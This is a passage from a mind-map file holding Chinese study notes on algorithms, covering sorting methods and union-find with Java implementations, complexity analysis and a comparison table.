        int N = nums.length;
        boolean isSorted = false;
        for (int i = N - 1; i &gt; 0 &amp;&amp; !isSorted; i--) {
            isSorted = true;
            for (int j = 0; j &lt; i; j++) {
                if (less(nums[j + 1], nums[j])) {
                    isSorted = false;
                    swap(nums, j, j + 1);
                }
            }
        }
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_892147475" CREATED="1754751610668" MODIFIED="1754751610670"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      插入排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      每次都将当前元素插入到左侧已经排序的数组中，使得插入之后左侧数组依然有序。
    </p>
    <p>
      对于数组 {3, 5, 2, 4, 1}，它具有以下逆序：(3, 2), (3, 1), (5, 2), (5, 4), (5, 1), (2, 1), (4, 1)，插入排序每次只能交换相邻元素，令逆序数量减少 1，因此插入排序需要交换的次数为逆序数量。
    </p>
    <p>
      插入排序的时间复杂度取决于数组的初始顺序，如果数组已经部分有序了，那么逆序较少，需要的交换次数也就较少，时间复杂度较低。
    </p>
    <ul>
      <li>
        平均情况下插入排序需要 ~N<sup>2</sup>/4 比较以及 ~N<sup>2</sup>/4 次交换；
      </li>
      <li>
        最坏的情况下需要 ~N<sup>2</sup>/2 比较以及 ~N<sup>2</sup>/2 次交换，最坏的情况是数组是倒序的；
      </li>
      <li>
        最好的情况下需要 N-1 次比较和 0 次交换，最好的情况就是数组已经有序了。
      </li>
    </ul>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/35253fa4-f60a-4e3b-aaec-8fc835aabdac.gif" width="200px"/>
    <br/>
    

    <pre>public class Insertion&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; {
    @Override
    public void sort(T[] nums) {
        int N = nums.length;
        for (int i = 1; i &lt; N; i++) {
            for (int j = i; j &gt; 0 &amp;&amp; less(nums[j], nums[j - 1]); j--) {
                swap(nums, j, j - 1);
            }
        }
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_861489049" CREATED="1754751610670" MODIFIED="1754751610672"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      希尔排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      对于大规模的数组，插入排序很慢，因为它只能交换相邻的元素，每次只能将逆序数量减少 1。希尔排序的出现就是为了解决插入排序的这种局限性，它通过交换不相邻的元素，每次可以将逆序数量减少大于 1。
    </p>
    <p>
      希尔排序使用插入排序对间隔 h 的序列进行排序。通过不断减小 h，最后令 h=1，就可以使得整个数组是有序的。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7818c574-97a8-48db-8e62-8bfb030b02ba.png" width="450px"/>
    <br/>
    

    <pre>public class Shell&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; {
    @Override
    public void sort(T[] nums) {
        int N = nums.length;
        int h = 1;
        while (h &lt; N / 3) {
            h = 3 * h + 1; // 1, 4, 13, 40, ...
        }
        while (h &gt;= 1) {
            for (int i = h; i &lt; N; i++) {
                for (int j = i; j &gt;= h &amp;&amp; less(nums[j], nums[j - h]); j -= h) {
                    swap(nums, j, j - h);
                }
            }
            h = h / 3;
        }
    }
}</pre>
    <p>
      希尔排序的运行时间达不到平方级别，使用递增序列 1, 4, 13, 40, ... 的希尔排序所需要的比较次数不会超过 N 的若干倍乘于递增序列的长度。后面介绍的高级排序算法只会比希尔排序快两倍左右。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_322329299" CREATED="1754751610673" MODIFIED="1754751610675"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      归并排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      归并排序的思想是将数组分成两部分，分别进行排序，然后归并起来。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ec840967-d127-4da3-b6bb-186996c56746.png" width="300px"/>
    <br/>
  </body>
</html></richcontent>
<node ID="ID_281497085" CREATED="1754751610675" MODIFIED="1754751610677"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 归并方法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      归并方法将数组中两个已经排序的部分归并成一个。
    </p>
    <pre>public abstract class MergeSort&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; {
    protected T[] aux;
    protected void merge(T[] nums, int l, int m, int h) {
        int i = l, j = m + 1;
        for (int k = l; k &lt;= h; k++) {
            aux[k] = nums[k]; // 将数据复制到辅助数组
        }
        for (int k = l; k &lt;= h; k++) {
            if (i &gt; m) {
                nums[k] = aux[j++];
            } else if (j &gt; h) {
                nums[k] = aux[i++];
            } else if (aux[i].compareTo(aux[j]) &lt;= 0) {
                nums[k] = aux[i++]; // 先进行这一步，保证稳定性
            } else {
                nums[k] = aux[j++];
            }
        }
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1079040164" CREATED="1754751610677" MODIFIED="1754751610679"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 自顶向下归并排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      将一个大数组分成两个小数组去求解。
    </p>
    <p>
      因为每次都将问题对半分成两个子问题，这种对半分的算法复杂度一般为 O(NlogN)。
    </p>
    <pre>public class Up2DownMergeSort&lt;T extends Comparable&lt;T&gt;&gt; extends MergeSort&lt;T&gt; {
    @Override
    public void sort(T[] nums) {
        aux = (T[]) new Comparable[nums.length];
        sort(nums, 0, nums.length - 1);
    }
    private void sort(T[] nums, int l, int h) {
        if (h &lt;= l) {
            return;
        }
        int mid = l + (h - l) / 2;
        sort(nums, l, mid);
        sort(nums, mid + 1, h);
        merge(nums, l, mid, h);
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1646728132" CREATED="1754751610680" MODIFIED="1754751610681"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 自底向上归并排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      先归并那些微型数组，然后成对归并得到的微型数组。
    </p>
    <pre>public class Down2UpMergeSort&lt;T extends Comparable&lt;T&gt;&gt; extends MergeSort&lt;T&gt; {
    @Override
    public void sort(T[] nums) {
        int N = nums.length;
        aux = (T[]) new Comparable[N];
        for (int sz = 1; sz &lt; N; sz += sz) {
            for (int lo = 0; lo &lt; N - sz; lo += sz + sz) {
                merge(nums, lo, lo + sz - 1, Math.min(lo + sz + sz - 1, N - 1));
            }
        }
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1822371927" CREATED="1754751610682" MODIFIED="1754751610682"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      快速排序
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_477831933" CREATED="1754751610684" MODIFIED="1754751610685"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 基本算法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <ul>
      <li>
        归并排序将数组分为两个子数组分别排序，并将有序的子数组归并使得整个数组排序；
      </li>
      <li>
        快速排序通过一个切分元素将数组分为两个子数组，左子数组小于等于切分元素，右子数组大于等于切分元素，将这两个子数组排序也就将整个数组排序了。
      </li>
    </ul>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6234eb3d-ccf2-4987-a724-235aef6957b1.png" width="280px"/>
    <br/>
    

    <pre>public class QuickSort&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; {
    @Override
    public void sort(T[] nums) {
        shuffle(nums);
        sort(nums, 0, nums.length - 1);
    }
    private void sort(T[] nums, int l, int h) {
        if (h &lt;= l)
            return;
        int j = partition(nums, l, h);
        sort(nums, l, j - 1);
        sort(nums, j + 1, h);
    }
    private void shuffle(T[] nums) {
        List&lt;Comparable&gt; list = Arrays.asList(nums);
        Collections.shuffle(list);
        list.toArray(nums);
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1224357189" CREATED="1754751610686" MODIFIED="1754751610688"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 切分
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      取 a[l] 作为切分元素，然后从数组的左端向右扫描直到找到第一个大于等于它的元素，再从数组的右端向左扫描找到第一个小于它的元素，交换这两个元素。不断进行这个过程，就可以保证左指针 i 的左侧元素都不大于切分元素，右指针 j 的右侧元素都不小于切分元素。当两个指针相遇时，将切分元素 a[l] 和 a[j] 交换位置。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c4859290-e27d-4f12-becf-e2a5c1f3a275.gif" width="320px"/>
    <br/>
    

    <pre>private int partition(T[] nums, int l, int h) {
    int i = l, j = h + 1;
    T v = nums[l];
    while (true) {
        while (less(nums[++i], v) &amp;&amp; i != h) ;
        while (less(v, nums[--j]) &amp;&amp; j != l) ;
        if (i &gt;= j)
            break;
        swap(nums, i, j);
    }
    swap(nums, l, j);
    return j;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1960451594" CREATED="1754751610688" MODIFIED="1754751610690"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 性能分析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      快速排序是原地排序，不需要辅助数组，但是递归调用需要辅助栈。
    </p>
    <p>
      快速排序最好的情况下是每次都正好将数组对半分，这样递归调用次数才是最少的。这种情况下比较次数为 C<sub>N</sub>=2C<sub>N/2</sub>+N，复杂度为 O(NlogN)。
    </p>
    <p>
      最坏的情况下，第一次从最小的元素切分，第二次从第二小的元素切分，如此这般。因此最坏的情况下需要比较 N<sup>2</sup>/2。为了防止数组最开始就是有序的，在进行快速排序时需要随机打乱数组。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_157711325" CREATED="1754751610691" MODIFIED="1754751610691"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 算法改进
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1080977606" CREATED="1754751610692" MODIFIED="1754751610693"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4.1 切换到插入排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      因为快速排序在小数组中也会递归调用自己，对于小数组，插入排序比快速排序的性能更好，因此在小数组中可以切换到插入排序。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_776594773" CREATED="1754751610694" MODIFIED="1754751610696"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4.2 三数取中
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      最好的情况下是每次都能取数组的中位数作为切分元素，但是计算中位数的代价很高。一种折中方法是取 3 个元素，并将大小居中的元素作为切分元素。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_317405331" CREATED="1754751610696" MODIFIED="1754751610698"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4.3 三向切分
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      对于有大量重复元素的数组，可以将数组切分为三部分，分别对应小于、等于和大于切分元素。
    </p>
    <p>
      三向切分快速排序对于有大量重复元素的随机数组可以在线性时间内完成排序。
    </p>
    <pre>public class ThreeWayQuickSort&lt;T extends Comparable&lt;T&gt;&gt; extends QuickSort&lt;T&gt; {
    @Override
    protected void sort(T[] nums, int l, int h) {
        if (h &lt;= l) {
            return;
        }
        int lt = l, i = l + 1, gt = h;
        T v = nums[l];
        while (i &lt;= gt) {
            int cmp = nums[i].compareTo(v);
            if (cmp &lt; 0) {
                swap(nums, lt++, i++);
            } else if (cmp &gt; 0) {
                swap(nums, i, gt--);
            } else {
                i++;
            }
        }
        sort(nums, l, lt - 1);
        sort(nums, gt + 1, h);
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1809251948" CREATED="1754751610698" MODIFIED="1754751610701"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 基于切分的快速选择算法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      快速排序的 partition() 方法，会返回一个整数 j 使得 a[l..j-1] 小于等于 a[j]，且 a[j+1..h] 大于等于 a[j]，此时 a[j] 就是数组的第 j 大元素。
    </p>
    <p>
      可以利用这个特性找出数组的第 k 个元素。
    </p>
    <p>
      该算法是线性级别的，假设每次能将数组二分，那么比较的总次数为 (N+N/2+N/4+..)，直到找到第 k 个元素，这个和显然小于 2N。
    </p>
    <pre>public T select(T[] nums, int k) {
    int l = 0, h = nums.length - 1;
    while (h &gt; l) {
        int j = partition(nums, l, h);
        if (j == k) {
            return nums[k];
        } else if (j &gt; k) {
            h = j - 1;
        } else {
            l = j + 1;
        }
    }
    return nums[k];
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1301076128" CREATED="1754751610701" MODIFIED="1754751610701"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      堆排序
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_760911459" CREATED="1754751610703" MODIFIED="1754751610705"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 堆
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      堆中某个节点的值总是大于等于或小于等于其子节点的值，并且堆是一颗完全二叉树。
    </p>
    <p>
      堆可以用数组来表示，这是因为堆是完全二叉树，而完全二叉树很容易就存储在数组中。位置 k 的节点的父节点位置为 k/2，而它的两个子节点的位置分别为 2k 和 2k+1。这里不使用数组索引为 0 的位置，是为了更清晰地描述节点的位置关系。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f48883c8-9d8a-494e-99a4-317d8ddb8552.png" width="170px"/>
    <br/>
    

    <pre>public class Heap&lt;T extends Comparable&lt;T&gt;&gt; {
    private T[] heap;
    private int N = 0;
    public Heap(int maxN) {
        this.heap = (T[]) new Comparable[maxN + 1];
    }
    public boolean isEmpty() {
        return N == 0;
    }
    public int size() {
        return N;
    }
    private boolean less(int i, int j) {
        return heap[i].compareTo(heap[j]) &lt; 0;
    }
    private void swap(int i, int j) {
        T t = heap[i];
        heap[i] = heap[j];
        heap[j] = t;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_349787794" CREATED="1754751610705" MODIFIED="1754751610707"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 上浮和下沉
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      在堆中，当一个节点比父节点大，那么需要交换这个两个节点。交换后还可能比它新的父节点大，因此需要不断地进行比较和交换操作，把这种操作称为上浮。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/99d5e84e-fc2a-49a3-8259-8de274617756.gif" width="270px"/>
    <br/>
    

    <pre>private void swim(int k) {
    while (k &gt; 1 &amp;&amp; less(k / 2, k)) {
        swap(k / 2, k);
        k = k / 2;
    }
}</pre>
    <p>
      类似地，当一个节点比子节点来得小，也需要不断地向下进行比较和交换操作，把这种操作称为下沉。一个节点如果有两个子节点，应当与两个子节点中最大那个节点进行交换。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4bf5e3fb-a285-4138-b3b6-780956eb1df1.gif" width="270px"/>
    <br/>
    

    <pre>private void sink(int k) {
    while (2 * k &lt;= N) {
        int j = 2 * k;
        if (j &lt; N &amp;&amp; less(j, j + 1))
            j++;
        if (!less(k, j))
            break;
        swap(k, j);
        k = j;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1591918818" CREATED="1754751610708" MODIFIED="1754751610709"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 插入元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      将新元素放到数组末尾，然后上浮到合适的位置。
    </p>
    <pre>public void insert(Comparable v) {
    heap[++N] = v;
    swim(N);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1253820936" CREATED="1754751610710" MODIFIED="1754751610711"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 删除最大元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      从数组顶端删除最大的元素，并将数组的最后一个元素放到顶端，并让这个元素下沉到合适的位置。
    </p>
    <pre>public T delMax() {
    T max = heap[1];
    swap(1, N--);
    heap[N + 1] = null;
    sink(1);
    return max;
}</pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_745490754" CREATED="1754751610712" MODIFIED="1754751610713"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 堆排序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      把最大元素和当前堆中数组的最后一个元素交换位置，并且不删除它，那么就可以得到一个从尾到头的递减序列，从正向来看就是一个递增序列，这就是堆排序。
    </p>
  </body>
</html></richcontent>
<node ID="ID_851835917" CREATED="1754751610714" MODIFIED="1754751610716"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5.1 构建堆
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      无序数组建立堆最直接的方法是从左到右遍历数组进行上浮操作。一个更高效的方法是从右至左进行下沉操作，如果一个节点的两个节点都已经是堆有序，那么进行下沉操作可以使得这个节点为根节点的堆有序。叶子节点不需要进行下沉操作，可以忽略叶子节点的元素，因此只需要遍历一半的元素即可。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c2ca8dd2-8d00-4a3e-bece-db7849ac9cfd.gif" width="210px"/>
    <br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1751016720" CREATED="1754751610716" MODIFIED="1754751610718"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5.2 交换堆顶元素与最后一个元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      交换之后需要进行下沉操作维持堆的有序状态。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d156bcda-ac8d-4324-95e0-0c8df41567c9.gif" width="250px"/>
    <br/>
    

    <pre>public class HeapSort&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; {
    /**
     * 数组第 0 个位置不能有元素
     */
    @Override
    public void sort(T[] nums) {
        int N = nums.length - 1;
        for (int k = N / 2; k &gt;= 1; k--)
            sink(nums, k, N);
        while (N &gt; 1) {
            swap(nums, 1, N--);
            sink(nums, 1, N);
        }
    }
    private void sink(T[] nums, int k, int N) {
        while (2 * k &lt;= N) {
            int j = 2 * k;
            if (j &lt; N &amp;&amp; less(nums, j, j + 1))
                j++;
            if (!less(nums, k, j))
                break;
            swap(nums, k, j);
            k = j;
        }
    }
    private boolean less(T[] nums, int i, int j) {
        return nums[i].compareTo(nums[j]) &lt; 0;
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1886567480" CREATED="1754751610718" MODIFIED="1754751610720"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 分析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      一个堆的高度为 logN，因此在堆中插入元素和删除最大元素的复杂度都为 logN。
    </p>
    <p>
      对于堆排序，由于要对 N 个节点进行下沉操作，因此复杂度为 NlogN。
    </p>
    <p>
      堆排序是一种原地排序，没有利用额外的空间。
    </p>
    <p>
      现代操作系统很少使用堆排序，因为它无法利用局部性原理进行缓存，也就是数组元素很少和相邻的元素进行比较和交换。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_3084970" CREATED="1754751610720" MODIFIED="1754751610720"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      小结
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_398756062" CREATED="1754751610722" MODIFIED="1754751610724"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 排序算法的比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <table>
      <tr>
        <th>
          算法
        </th>
        <th>
          稳定性
        </th>
        <th>
          时间复杂度
        </th>
        <th>
          空间复杂度
        </th>
        <th>
          备注
        </th>
      </tr>
      <tr>
        <td>
          选择排序
        </td>
        <td>
          ×
        </td>
        <td>
          N<sup>2</sup>
        </td>
        <td>
          1
        </td>
        <td>
          
        </td>
      </tr>
      <tr>
        <td>
          冒泡排序
        </td>
        <td>
          √
        </td>
        <td>
          N<sup>2</sup>
        </td>
        <td>
          1
        </td>
        <td>
          
        </td>
      </tr>
      <tr>
        <td>
          插入排序
        </td>
        <td>
          √
        </td>
        <td>
          N ~ N<sup>2</sup>
        </td>
        <td>
          1
        </td>
        <td>
          时间复杂度和初始顺序有关
        </td>
      </tr>
      <tr>
        <td>
          希尔排序
        </td>
        <td>
          ×
        </td>
        <td>
          N 的若干倍乘于递增序列的长度
        </td>
        <td>
          1
        </td>
        <td>
          改进版插入排序
        </td>
      </tr>
      <tr>
        <td>
          快速排序
        </td>
        <td>
          ×
        </td>
        <td>
          NlogN
        </td>
        <td>
          logN
        </td>
        <td>
          
        </td>
      </tr>
      <tr>
        <td>
          三向切分快速排序
        </td>
        <td>
          ×
        </td>
        <td>
          N ~ NlogN
        </td>
        <td>
          logN
        </td>
        <td>
          适用于有大量重复主键
        </td>
      </tr>
      <tr>
        <td>
          归并排序
        </td>
        <td>
          √
        </td>
        <td>
          NlogN
        </td>
        <td>
          N
        </td>
        <td>
          
        </td>
      </tr>
      <tr>
        <td>
          堆排序
        </td>
        <td>
          ×
        </td>
        <td>
          NlogN
        </td>
        <td>
          1
        </td>
        <td>
          无法利用局部性原理
        </td>
      </tr>
    </table>
    <p>
      快速排序是最快的通用排序算法，它的内循环的指令很少，而且它还能利用缓存，因为它总是顺序地访问数据。它的运行时间近似为 ~cNlogN，这里的 c 比其它线性对数级别的排序算法都要小。
    </p>
    <p>
      使用三向切分快速排序，实际应用中可能出现的某些分布的输入能够达到线性级别，而其它排序算法仍然需要线性对数时间。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_263303706" CREATED="1754751610725" MODIFIED="1754751610726"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. Java 的排序算法实现
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      Java 主要排序方法为 java.util.Arrays.sort()，对于原始数据类型使用三向切分的快速排序，对于引用类型使用归并排序。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1822714920" CREATED="1754750433499" MODIFIED="1754751613729" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%AE%97%E6%B3%95%20-%20%E5%B9%B6%E6%9F%A5%E9%9B%86.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    并查集
  </body>
</html>
</richcontent>
<node ID="ID_683882806" CREATED="1754751613731" MODIFIED="1754751613734"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      前言
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      用于解决动态连通性问题，能动态连接两个点，并且判断两个点是否连通。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/02943a90-7dd4-4e9a-9325-f8217d3cc54d.jpg" width="350"/>
    <br/>
    

    <table>
      <tr>
        <th>
          方法
        </th>
        <th>
          描述
        </th>
      </tr>
      <tr>
        <td>
          UF(int N)
        </td>
        <td>
          构造一个大小为 N 的并查集
        </td>
      </tr>
      <tr>
        <td>
          void union(int p, int q)
        </td>
        <td>
          连接 p 和 q 节点
        </td>
      </tr>
      <tr>
        <td>
          int find(int p)
        </td>
        <td>
          查找 p 所在的连通分量编号
        </td>
      </tr>
      <tr>
        <td>
          boolean connected(int p, int q)
        </td>
        <td>
          判断 p 和 q 节点是否连通
        </td>
      </tr>
    </table>
    <pre>public abstract class UF {
    protected int[] id;
    public UF(int N) {
        id = new int[N];
        for (int i = 0; i &lt; N; i++) {
            id[i] = i;
        }
    }
    public boolean connected(int p, int q) {
        return find(p) == find(q);
    }
    public abstract int find(int p);
    public abstract void union(int p, int q);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_638225231" CREATED="1754751613734" MODIFIED="1754751613736"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Quick Find
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      可以快速进行 find 操作，也就是可以快速判断两个节点是否连通。
    </p>
    <p>
      需要保证同一连通分量的所有节点的 id 值相等，就可以通过判断两个节点的 id 值是否相等从而判断其连通性。
    </p>
    <p>
      但是 union 操作代价却很高，需要将其中一个连通分量中的所有节点 id 值都修改为另一个节点的 id 值。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0972501d-f854-4d26-8fce-babb27c267f6.jpg" width="320"/>
    <br/>
    

    <pre>public class QuickFindUF extends UF {
    public QuickFindUF(int N) {
        super(N);
    }
    @Override
    public int find(int p) {
        return id[p];
    }
    @Override
    public void union(int p, int q) {
        int pID = find(p);
        int qID = find(q);
        if (pID == qID) {
            return;
        }
        for (int i = 0; i &lt; id.length; i++) {
            if (id[i] == pID) {
                id[i] = qID;
            }
        }
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1001892659" CREATED="1754751613737" MODIFIED="1754751613739"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Quick Union
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      可以快速进行 union 操作，只需要修改一个节点的 id 值即可。
    </p>
    <p>
      但是 find 操作开销很大，因为同一个连通分量的节点 id 值不同，id 值只是用来指向另一个节点。因此需要一直向上查找操作，直到找到最上层的节点。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/11b27de5-5a9d-45e4-95cc-417fa3ad1d38.jpg" width="280"/>
    <br/>
    

    <pre>public class QuickUnionUF extends UF {
    public QuickUnionUF(int N) {
        super(N);
    }
    @Override
    public int find(int p) {
        while (p != id[p]) {
            p = id[p];
        }
        return p;
    }
    @Override
    public void union(int p, int q) {
        int pRoot = find(p);
        int qRoot = find(q);
        if (pRoot != qRoot) {
            id[pRoot] = qRoot;
        }
    }
}</pre>
    <p>
      这种方法可以快速进行 union 操作，但是 find 操作和树高成正比，最坏的情况下树的高度为节点的数目。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/23e4462b-263f-4d15-8805-529e0ca7a4d1.jpg" width="100"/>
    <br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_131585313" CREATED="1754751613739" MODIFIED="1754751613742"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      加权 Quick Union
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      为了解决 quick-union 的树通常会很高的问题，加权 quick-union 在 union 操作时会让较小的树连接较大的树上面。
    </p>
    <p>
      理论研究证明，加权 quick-union 算法构造的树深度最多不超过 logN。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a9f18f8a-c1ea-422e-aa56-d91716b0f755.jpg" width="150"/>
    <br/>
    

    <pre>public class WeightedQuickUnionUF extends UF {
    // 保存节点的数量信息
    private int[] sz;
    public WeightedQuickUnionUF(int N) {
        super(N);
        this.sz = new int[N];
        for (int i = 0; i &lt; N; i++) {
            this.sz[i] = 1;
        }
    }
    @Override
    public int find(int p) {
        while (p != id[p]) {
            p = id[p];
        }
        return p;
    }
    @Override
    public void union(int p, int q) {
        int i = find(p);
        int j = find(q);
        if (i == j) return;
